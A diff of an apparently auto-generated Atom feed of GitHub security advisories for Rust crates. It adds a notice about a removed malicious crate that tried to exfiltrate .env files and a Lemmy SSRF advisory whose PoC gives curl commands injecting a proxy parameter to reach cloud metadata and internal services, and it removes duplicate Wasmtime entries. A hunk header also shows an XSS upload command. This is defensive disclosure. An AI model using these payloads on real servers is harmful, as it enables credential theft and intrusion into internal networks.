@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-03-04T20:51:25.137Z</updated>
+    <updated>2026-03-04T21:20:17.358Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,106 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[time_calibrators] `time_calibrators` was removed from crates.io due to malicious code]]></title>
+        <id>https://github.com/advisories/GHSA-wf45-3gpw-vrqv</id>
+        <link href="https://github.com/advisories/GHSA-wf45-3gpw-vrqv"/>
+        <updated>2026-03-04T21:07:41.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>time_calibrators</code> crate attempted to exfiltrate <code>.env</code> files to a server that was in turn impersonating the legitimate <code>timeapi.io</code> service.</p>
+<p>The malicious crate had 1 version published on 2026-03-03 approximately 3 hours before removal and had no evidence of actual downloads. There were no crates depending on this crate on crates.io.</p>
+<p>Rust security response working group thanks cybergeek for finding and reporting this, and thanks to Emily Albini for co-ordinating with the crates.io team.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0031.html">https://rustsec.org/advisories/RUSTSEC-2026-0031.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-wf45-3gpw-vrqv">https://github.com/advisories/GHSA-wf45-3gpw-vrqv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wf45-3gpw-vrqv</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-04T21:07:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[lemmy_routes] Lemmy has unauthenticated SSRF via file_type query parameter injection in image endpoint]]></title>
+        <id>https://github.com/advisories/GHSA-jvxv-2jjp-jxc3</id>
+        <link href="https://github.com/advisories/GHSA-jvxv-2jjp-jxc3"/>
+        <updated>2026-03-04T20:55:01.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>GET /api/v4/image/{filename}</code> endpoint is vulnerable to unauthenticated SSRF through parameter injection in the <code>file_type</code> query parameter. An attacker can inject arbitrary query parameters into the internal request to pict-rs, including the <code>proxy</code> parameter which causes pict-rs to fetch arbitrary URLs.</p>
+<h2 id="affected-code">Affected code</h2>
+<p><code>crates/routes/src/images/download.rs</code>, lines 17-40 (<code>get_image</code> function):</p>
+<pre><code class="language-rust">pub async fn get_image(
+  filename: Path&lt;String&gt;,
+  Query(params): Query&lt;ImageGetParams&gt;,
+  req: HttpRequest,
+  context: Data&lt;LemmyContext&gt;,
+) -&gt; LemmyResult&lt;HttpResponse&gt; {
+  let name = &amp;filename.into_inner();
+  let pictrs_url = context.settings().pictrs()?.url;
+  let processed_url = if params.file_type.is_none() &amp;&amp; params.max_size.is_none() {
+    format!("{}image/original/{}", pictrs_url, name)
+  } else {
+    let file_type = file_type(params.file_type, name);
+    let mut url = format!("{}image/process.{}?src={}", pictrs_url, file_type, name);
+    // ...
+  };
+  do_get_image(processed_url, req, &amp;context).await
+}
+</code></pre>
+<p>The <code>file_type</code> parameter (<code>ImageGetParams.file_type: Option&lt;String&gt;</code>) is directly interpolated into the URL string without any validation or encoding. Since pict-rs's <code>/image/process.{ext}</code> endpoint supports a <code>?proxy={url}</code> parameter for fetching remote images, an attacker can inject <code>?proxy=...</code> via <code>file_type</code> to make pict-rs fetch arbitrary URLs.</p>
+<p>This endpoint does not require authentication (no <code>LocalUserView</code> extractor).</p>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Basic SSRF - make pict-rs fetch AWS metadata endpoint
+# The file_type value is: jpg?proxy=http://169.254.169.254/latest/meta-data&amp;x=
+# This constructs: http://pictrs:8080/image/process.jpg?proxy=http://169.254.169.254/latest/meta-data&amp;x=?src=anything
+
+curl -v 'https://TARGET/api/v4/image/anything?file_type=jpg%3Fproxy%3Dhttp%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%26x%3D'
+
+# Scan internal services on the Docker network
+curl -v 'https://TARGET/api/v4/image/anything?file_type=jpg%3Fproxy%3Dhttp%3A%2F%2Flemmy%3A8536%2Fapi%2Fv4%2Fsite%26x%3D'
+
+# The same issue exists in the image_proxy endpoint, but it requires the
+# proxy URL to exist in the remote_image table (RemoteImage::validate check),
+# making it harder to exploit.
+</code></pre>
+<p>The response from the internal URL is streamed back to the attacker through pict-rs and Lemmy.</p>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated attacker can:</p>
+<ul>
+<li>Access cloud metadata services (AWS/GCP/Azure instance metadata) from the pict-rs service</li>
+<li>Scan and interact with internal services on the Docker network (pict-rs is typically co-located with Lemmy, PostgreSQL, etc.)</li>
+<li>Bypass the <code>RemoteImage::validate()</code> check that protects the <code>image_proxy</code> endpoint</li>
+</ul>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Validate the <code>file_type</code> parameter to only allow alphanumeric characters:</p>
+<pre><code class="language-rust">fn file_type(file_type: Option&lt;String&gt;, name: &amp;str) -&gt; String {
+  let ft = file_type
+    .unwrap_or_else(|| name.split('.').next_back().unwrap_or("jpg").to_string());
+  if ft.chars().all(|c| c.is_alphanumeric()) {
+    ft
+  } else {
+    "jpg".to_string()
+  }
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/LemmyNet/lemmy/security/advisories/GHSA-jvxv-2jjp-jxc3">https://github.com/LemmyNet/lemmy/security/advisories/GHSA-jvxv-2jjp-jxc3</a></li>
+<li><a href="https://github.com/LemmyNet/lemmy/commit/f47a03f56d1797bceab5f34b6f624c91cecd5871">https://github.com/LemmyNet/lemmy/commit/f47a03f56d1797bceab5f34b6f624c91cecd5871</a></li>
+<li><a href="https://github.com/advisories/GHSA-jvxv-2jjp-jxc3">https://github.com/advisories/GHSA-jvxv-2jjp-jxc3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jvxv-2jjp-jxc3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-04T20:55:00.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[time_calibrator] `time_calibrator` was removed from crates.io due to malicious code]]></title>
         <id>https://github.com/advisories/GHSA-77xj-rrh3-wx3v</id>
@@ -1142,79 +1242,5 @@ mc cp xss.html rustfs/my-bucket/xss.pdf --attr "Content-Type=text/html"
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-02-25T19:23:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[wasmtime] Wasmtime can panic when adding excessive fields to a `wasi:http/types.fields` instance]]></title>
-        <id>https://github.com/advisories/GHSA-243v-98vx-264h</id>
-        <link href="https://github.com/advisories/GHSA-243v-98vx-264h"/>
-        <updated>2026-02-27T20:25:49.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Wasmtime's implementation of the <code>wasi:http/types.fields</code> resource is susceptible to panics when too many fields are added to the set of headers. Wasmtime's implementation in the <code>wasmtime-wasi-http</code> crate is backed by a data structure which panics when it reaches excessive capacity and this condition was not handled gracefully in Wasmtime. Panicking in a WASI implementation is a Denial of Service vector for embedders and is treated as a security vulnerability in Wasmtime.</p>
-<h3 id="patches">Patches</h3>
-<p>Wasmtime 24.0.6, 36.0.6, 40.0.4, 41.0.4, and 42.0.0 patch this vulnerability and return a trap to the guest instead of panicking.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There are no known workarounds at this time, embedders are encouraged to update to a patched version of Wasmtime.</p>
-<h3 id="resources">Resources</h3>
-<ul>
-<li><a href="https://docs.rs/http/1.4.0/http/header/#limitations">Limitations of <code>http::HeaderMap</code></a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-243v-98vx-264h">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-243v-98vx-264h</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/commit/301dc7162cca51def19131019af1187f45901c0a">https://github.com/bytecodealliance/wasmtime/commit/301dc7162cca51def19131019af1187f45901c0a</a></li>
-<li><a href="https://docs.rs/http/1.4.0/http/header/#limitations">https://docs.rs/http/1.4.0/http/header/#limitations</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v24.0.6">https://github.com/bytecodealliance/wasmtime/releases/tag/v24.0.6</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v36.0.6">https://github.com/bytecodealliance/wasmtime/releases/tag/v36.0.6</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v40.0.4">https://github.com/bytecodealliance/wasmtime/releases/tag/v40.0.4</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v41.0.4">https://github.com/bytecodealliance/wasmtime/releases/tag/v41.0.4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27572">https://nvd.nist.gov/vuln/detail/CVE-2026-27572</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0021.html">https://rustsec.org/advisories/RUSTSEC-2026-0021.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-243v-98vx-264h">https://github.com/advisories/GHSA-243v-98vx-264h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-243v-98vx-264h</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-24T21:08:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[wasmtime] Wasmtime can panic when adding excessive fields to a `wasi:http/types.fields` instance]]></title>
-        <id>https://github.com/advisories/GHSA-243v-98vx-264h</id>
-        <link href="https://github.com/advisories/GHSA-243v-98vx-264h"/>
-        <updated>2026-02-27T20:25:49.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Wasmtime's implementation of the <code>wasi:http/types.fields</code> resource is susceptible to panics when too many fields are added to the set of headers. Wasmtime's implementation in the <code>wasmtime-wasi-http</code> crate is backed by a data structure which panics when it reaches excessive capacity and this condition was not handled gracefully in Wasmtime. Panicking in a WASI implementation is a Denial of Service vector for embedders and is treated as a security vulnerability in Wasmtime.</p>
-<h3 id="patches">Patches</h3>
-<p>Wasmtime 24.0.6, 36.0.6, 40.0.4, 41.0.4, and 42.0.0 patch this vulnerability and return a trap to the guest instead of panicking.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There are no known workarounds at this time, embedders are encouraged to update to a patched version of Wasmtime.</p>
-<h3 id="resources">Resources</h3>
-<ul>
-<li><a href="https://docs.rs/http/1.4.0/http/header/#limitations">Limitations of <code>http::HeaderMap</code></a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-243v-98vx-264h">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-243v-98vx-264h</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/commit/301dc7162cca51def19131019af1187f45901c0a">https://github.com/bytecodealliance/wasmtime/commit/301dc7162cca51def19131019af1187f45901c0a</a></li>
-<li><a href="https://docs.rs/http/1.4.0/http/header/#limitations">https://docs.rs/http/1.4.0/http/header/#limitations</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v24.0.6">https://github.com/bytecodealliance/wasmtime/releases/tag/v24.0.6</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v36.0.6">https://github.com/bytecodealliance/wasmtime/releases/tag/v36.0.6</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v40.0.4">https://github.com/bytecodealliance/wasmtime/releases/tag/v40.0.4</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v41.0.4">https://github.com/bytecodealliance/wasmtime/releases/tag/v41.0.4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27572">https://nvd.nist.gov/vuln/detail/CVE-2026-27572</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0021.html">https://rustsec.org/advisories/RUSTSEC-2026-0021.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-243v-98vx-264h">https://github.com/advisories/GHSA-243v-98vx-264h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-243v-98vx-264h</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-24T21:08:06.000Z</published>
     </entry>
 </feed>
